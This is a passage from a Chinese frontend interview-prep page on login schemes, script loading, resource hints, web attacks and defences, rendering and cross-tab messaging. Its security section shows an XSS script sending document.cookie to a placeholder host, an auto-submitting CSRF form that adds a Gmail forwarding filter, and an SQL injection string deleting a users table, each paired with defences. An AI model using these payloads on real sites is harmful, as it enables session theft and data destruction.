class="header-anchor">#</a> 基于 cookie</h3> <p>简单的，如果业务系统都在同一主域名下，比如 <code>wenku.baidu.com</code> <code>tieba.baidu.com</code> ，就好办了。
可以直接把 cookie domain 设置为主域名 <code>baidu.com</code> ，百度也就是这么干的。</p> <h3 id="sso"><a href="#sso" class="header-anchor">#</a> SSO</h3> <p>复杂一点的，滴滴这么潮的公司，同时拥有 <code>didichuxing.com</code> <code>xiaojukeji.com</code> <code>didiglobal.com</code> 等域名，种 cookie 是完全绕不开的。需要使用 SSO 技术方案</p> <p><img src="/assets/img/sso.5cf0e505.png" alt=""></p> <h3 id="oauth2"><a href="#oauth2" class="header-anchor">#</a> OAuth2</h3> <p>上述 SSO 是 oauth 的实际案例，其他常见的还有微信登录、github 登录等。即，当设计到第三方用户登录校验时，都会使用 OAuth2.0 标准。
流程参考 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener noreferrer">RFC 6749<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="defer-和-async-属性有何区别"><a href="#defer-和-async-属性有何区别" class="header-anchor">#</a> defer 和 async 属性有何区别</h2> <ul><li><code>&lt;script src=&quot;xxx.js&quot;&gt;</code> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。</li> <li><code>&lt;script async src=&quot;xxx.js&quot;&gt;</code> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。</li> <li><code>&lt;script defer src=&quot;xxx.js&quot;&gt;</code> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。</li></ul> <p><img src="/assets/img/async-defer.cd3c1d64.png" alt=""></p> <h2 id="连环问-preload-prefetch-的区别"><a href="#连环问-preload-prefetch-的区别" class="header-anchor">#</a> 连环问：preload prefetch 的区别</h2> <ul><li>preload 表示资源在当前页面使用，浏览器会<strong>优先</strong>加载</li> <li>prefetch 表示资源可能在<strong>未来的页面</strong>（如通过链接打开下一个页面）使用，浏览器将在<strong>空闲时</strong>加载</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>JS and CSS preload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- preload --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

  <span class="token comment">&lt;!-- prefetch --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>other.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

  <span class="token comment">&lt;!-- 引用 css --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- 引用 js --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h2 id="连环问-dns-prefetch-和-preconnect-有什么作用"><a href="#连环问-dns-prefetch-和-preconnect-有什么作用" class="header-anchor">#</a> 连环问：dns-prefetch 和 preconnect 有什么作用？</h2> <p>一个 http 请求，第一步就是 DNS 解析得到 IP ，然后进行 TCP 连接。连接成功后再发送请求。</p> <p>dns-prefetch 即 DNS 预获取，preconnect 即预连接。<br>
当网页请求<strong>第三方</strong>资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>dns-prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://fonts.gstatic.com/<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preconnect<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://fonts.gstatic.com/<span class="token punctuation">&quot;</span></span> <span class="token attr-name">crossorigin</span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h2 id="你所了解的前端攻击手段有哪些-该如何预防"><a href="#你所了解的前端攻击手段有哪些-该如何预防" class="header-anchor">#</a> 你所了解的前端攻击手段有哪些，该如何预防？</h2> <h3 id="xss"><a href="#xss" class="header-anchor">#</a> XSS</h3> <p>Cross Site Scripting 跨站脚本攻击</p> <p>用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br>
该内容再显示时，这些代码也将会被执行，形成了攻击效果。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 例如用户提交的内容中有： --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>
  img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://xxx.com/api/xxx?userInfo='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie <span class="token comment">// 将 cookie 提交到自己的服务器</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>最简单的解决方式：替换特殊字符</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> newStr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
</code></pre></div><p>也可以使用第三方工具，例如</p> <ul><li>https://www.npmjs.com/package/xss</li> <li>https://www.npmjs.com/package/escape-html</li></ul> <p>现代框架默认会屏蔽 XSS 攻击，除非自己手动开启</p> <ul><li>Vue <code>v-html</code></li> <li>React <code>dangerouslySetInnerHTML</code></li></ul> <h3 id="csrf"><a href="#csrf" class="header-anchor">#</a> CSRF</h3> <p>Cross-site request forgery 跨站请求伪造</p> <p>请看下面的故事</p> <ul><li>小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”</li> <li>小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了</li></ul> <p>但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 <code>hacker@hackermail.com</code> 。<br>
因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cf2_emc<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>true<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cf2_email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hacker@hakermail.com<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  .....
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>irf<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>on<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>nvp_bu_cftb<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Create Filter<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment">// PS：有些是 post 请求，有些是 get 请求</span>
  <span class="token comment">//     get 请求如果用 img.src 还可以规避跨域，更加危险</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>邮件经常用来接收验证码，这是很危险的事情。<br>
当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。</p> <p>CSRF 的过程</p> <ul><li>用户登录了 <code>a.com</code> ，有了 cookie</li> <li>黑客引诱用户访问 <code>b.com</code> 网页，并在其中发起一个跨站请求 <code>a.com/api/xxx</code></li> <li><code>a.com</code> API 收到 cookie ，误以为是真实用户的请求，就受理了</li></ul> <p>CSRF 的预防</p> <ul><li>严格的跨域请求限制</li> <li>为 cookie 设置 <code>SameSite</code> 不随跨域请求被发送 <code>Set-Cookie: key1=val1; key2=val2; SameSite=Strict;</code></li> <li>关键接口使用短信验证码等双重验证</li></ul> <h3 id="点击劫持-clickjacking"><a href="#点击劫持-clickjacking" class="header-anchor">#</a> 点击劫持 Clickjacking</h3> <p>小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了慕课网双越老师。因为他可能已经登录了慕课网。<br>
这可以是关注，也可以是付款转账等其他危险操作。</p> <p><img src="/assets/img/click.10048af4.png" alt=""></p> <p>点击劫持的原理：黑客在自己的网站，使用隐藏的 <code>&lt;iframe&gt;</code> 嵌入其他网页，诱导用户按顺序点击。</p> <p>使用 JS 预防</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname <span class="token operator">!==</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'您正在访问不安全的页面，即将跳转到安全页面！'</span><span class="token punctuation">)</span>
  top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href
<span class="token punctuation">}</span>
</code></pre></div><p>增加 http header <code>X-Frame-Options:SAMEORIGIN</code> ，让 <code>&lt;iframe&gt;</code> 只能加载同域名的网页。</p> <p>PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。</p> <h3 id="ddos"><a href="#ddos" class="header-anchor">#</a> DDoS</h3> <p>Distributed denial-of-service 分布式拒绝服务</p> <p>通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br>
类似于恶意堵车，妨碍正常车辆通行。</p> <p>网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br>
由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。</p> <p>DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如<a href="https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL" target="_blank" rel="noopener noreferrer">阿里云 WAF<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。</p> <p>PS：阮一峰的网站就曾遭遇过 DDoS 攻击 https://www.ruanyifeng.com/blog/2018/06/ddos.html</p> <h3 id="sql-注入"><a href="#sql-注入" class="header-anchor">#</a> SQL 注入</h3> <p>普通的登录方式，输入用户名 <code>zhangsan</code> 、密码 <code>123</code> ，然后服务端去数据库查询。<br>
会执行一个 sql 语句 <code>select * from users where username='zhangsan' and password='123'</code> ，然后判断是否找到该用户。</p> <p>如果用户输入的是用户名 <code>' delete from users where 1=1; --</code> ，密码 <code>'123'</code><br>
那生成的 sql 语句就是 <code>select * from users where username='' delete from users where 1=1; --' and password='123'</code><br>
这样就会把 <code>users</code> 数据表全部删除。</p> <p>防止 SQL 注入：服务端进行特殊字符转换，如把 <code>'</code> 转换为 <code>\'</code></p> <h3 id="答案-6"><a href="#答案-6" class="header-anchor">#</a> 答案</h3> <ul><li>XSS</li> <li>CSRF</li> <li>点击劫持</li> <li>DDoS</li> <li>SQL 注入</li></ul> <h2 id="从输入-url-到显示页面的完整过程"><a href="#从输入-url-到显示页面的完整过程" class="header-anchor">#</a> 从输入 url 到显示页面的完整过程</h2> <h3 id="特别注意"><a href="#特别注意" class="header-anchor">#</a> 特别注意</h3> <p>现在浏览器经过多年发展和优化，加载和渲染机制已经非常复杂，我们只能讲解基本的流程。不可较真细节。</p> <h3 id="步骤"><a href="#步骤" class="header-anchor">#</a> 步骤</h3> <ul><li>网络请求</li> <li>解析</li> <li>渲染页面</li></ul> <h3 id="网络请求"><a href="#网络请求" class="header-anchor">#</a> 网络请求</h3> <ul><li>DNS 解析，根据域名获得 IP 地址</li> <li>建立 TCP 连接 “三次握手”</li> <li>发送 http 请求</li> <li>接收请求响应，获得网页 html 代码</li></ul> <p>获取了 html 之后，解析过程中还可能会继续加载其他资源：js css 图片等。<br>
静态资源可能会有强缓存，加载时要判断。</p> <p><img src="/assets/img/cache-control.664cb370.png" alt=""></p> <h3 id="解析"><a href="#解析" class="header-anchor">#</a> 解析</h3> <blockquote><p>html css 等源代码是字符串形式，需要解析为特定的数据结构，才能被后续使用。</p></blockquote> <p>过程</p> <ul><li>html 构建 DOM 树</li> <li>css 构建 CSSOM（即 style tree）</li> <li>两者结合形成 Render tree （包括尺寸、定位等）</li></ul> <p><img src="/assets/img/render.85a66640.png" alt=""></p> <p>css 包括：</p> <ul><li>内嵌 css <code>&lt;style&gt;</code></li> <li>外链 css <code>&lt;link&gt;</code></li></ul> <p>解析到 <code>&lt;script&gt;</code> 加载，并有可能修改 DOM 树和 render tree 。</p> <ul><li>内嵌 js</li> <li>外链 js</li></ul> <p>PS：加载和执行 <code>&lt;script&gt;</code> 的情况比较多，如有 <code>defer</code> <code>async</code> 属性，就不一样。</p> <p>解析到 <code>&lt;img&gt;</code> 等媒体文件，也要并行加载。加载完成后再渲染页面。</p> <p>综上，为了避免不必要的情况，要遵守以下规则</p> <ul><li>css 尽量放在 <code>&lt;head&gt;</code> 中，不要异步加载 css</li> <li>js 尽量放在 <code>&lt;body&gt;</code> 最后，不要中途加载、执行 js</li> <li><code>&lt;img&gt;</code> 等媒体文件尽量限制尺寸，防止渲染时重绘页面</li></ul> <h3 id="渲染页面"><a href="#渲染页面" class="header-anchor">#</a> 渲染页面</h3> <p>通过 render tree 绘制页面。</p> <p>绘制完成之后，还要继续执行异步加载的资源</p> <ul><li>异步的 css ，重新渲染页面</li> <li>异步的 js ，执行（可能重新渲染页面）</li> <li>异步加载的图片等，可能重新渲染页面（根据图片尺寸）</li></ul> <p>最后页面渲染完成。</p> <h3 id="答案-7"><a href="#答案-7" class="header-anchor">#</a> 答案</h3> <ul><li>网络请求
<ul><li>DNS 解析</li> <li>TCP 连接</li> <li>HTTP 请求和响应</li></ul></li> <li>解析
<ul><li>DOM 树</li> <li>render tree</li></ul></li> <li>渲染页面
<ul><li>可能重绘页面</li></ul></li></ul> <h2 id="连环问-什么是重绘-repaint-和重排-reflow-有何区别"><a href="#连环问-什么是重绘-repaint-和重排-reflow-有何区别" class="header-anchor">#</a> 连环问：什么是重绘 repaint 和重排 reflow ，有何区别</h2> <p>页面渲染完成之后，随着异步加载和用户的操作，会随时发生 repaint 或者 reflow 。例如</p> <ul><li>各种网页动画</li> <li>modal dialog 弹框</li> <li>页面元素的新增、删除和隐藏</li></ul> <p>结论：重排的影响更大</p> <ul><li>重绘 repaint ：某些元素的外观被改变，但尺寸和定位不变，例如：元素的背景色改变。</li> <li>重排 reflow ：重新生成布局，重新排列元素。如一个元素高度变化，导致所有元素都下移。</li></ul> <p>重绘不一定重排，但重排一定会导致重绘。<br>
所以，要尽量避免重排。</p> <ul><li>集中修改样式，或直接使用 <code>class</code></li> <li>DOM 操作前先使用 <code>display: none</code> 脱离文档流</li> <li>使用 BFC ，不影响外部的元素</li> <li>对于频繁触发的操作（<code>resize</code> <code>scroll</code> 等）使用节流和防抖</li> <li>使用 <code>createDocumentFragment</code> 进行批量 DOM 操作</li> <li>优化动画，如使用 <code>requestAnimationFrame</code> 或者 CSS3（可启用 GPU 加速）</li></ul> <h2 id="连环问-触发-css-bfc-的条件"><a href="#连环问-触发-css-bfc-的条件" class="header-anchor">#</a> 连环问：触发 css BFC 的条件</h2> <p>BFC - Block Formatting Context 块格式化上下文</p> <ul><li>根节点 html</li> <li>设置 float <code>left</code> <code>right</code></li> <li>设置 overflow <code>auto</code> <code>scroll</code> <code>hidden</code></li> <li>设置 display <code>inline-block</code> <code>table</code> <code>table-cell</code> <code>flex</code> <code>grid</code></li> <li>设置 position <code>absolute</code> <code>fixed</code></li></ul> <h2 id="网络多标签之间如何通讯"><a href="#网络多标签之间如何通讯" class="header-anchor">#</a> 网络多标签之间如何通讯？</h2> <p>例如打开两个 chrome 标签，一个访问列表页，一个访问详情页。在详情页修改了标题，列表页也要同步过来。</p> <h3 id="websocket"><a href="#websocket" class="header-anchor">#</a> webSocket</h3> <p>通过 webSocket 多页面通讯，无跨域限制。</p> <h3 id="localstorage"><a href="#localstorage" class="header-anchor">#</a> localStorage</h3> <p>同域的两个页面，可以通过 localStorage 通讯。A 页面可以监听到 B 页面的数据变化。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// list 页面</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'storage'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>key<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'newValue'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>newValue<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// detail 页面</span>
localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'changeInfo'</span><span class="token punctuation">,</span> <span class="token string">'xxx'</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="sharedworker"><a href="#sharedworker" class="header-anchor">#</a> SharedWorker</h3> <p>Javascript 是单线程的，而且和页面渲染线程互斥。所以，一些计算量大的操作会影响页面渲染。<br></p> <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API/Using_web_workers" target="_blank" rel="noopener noreferrer">WebWorker<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 可以 <code>new Worker('xxx.js')</code> 用来进行 JS 计算，并通过 <code>postMessage</code> 和 <code>onmessage</code> 和网页通讯。<br>
但这个 worker 是当前页面专有的，不得多个页面、iframe 共享。</p> <p>PS：WebWorker 专用于 JS 计算，不支持 DOM 操作。</p> <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/SharedWorker" target="_blank" rel="noopener noreferrer">SharedWorker<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 可以被同域的多个页面共享使用，也可以用于通讯。<br>
源码参考 msg-sharedWork-list.html 和 msg-sharedWork-detail.html 。注意，worker 中的日志需要 <code>chrome://inspect</code> 中打开控制台查看。</p> <p>PS：注意浏览器兼容性，不支持 IE11</p> <h3 id="答案-8"><a href="#答案-8" class="header-anchor">#</a> 答案</h3> <ul><li>webSocket 需要服务端参与，但不限制跨域</li> <li>localStorage 简单易用</li> <li>SharedWorker 本地调试不太方便，考虑浏览器兼容性</li></ul> <h2 id="连环问-iframe-通讯"><a href="#连环问-iframe-通讯" class="header-anchor">#</a> 连环问：iframe 通讯</h2> <p>除了上述几个方法，iframe 通讯最常用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage" target="_blank" rel="noopener noreferrer">window.postMessage<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 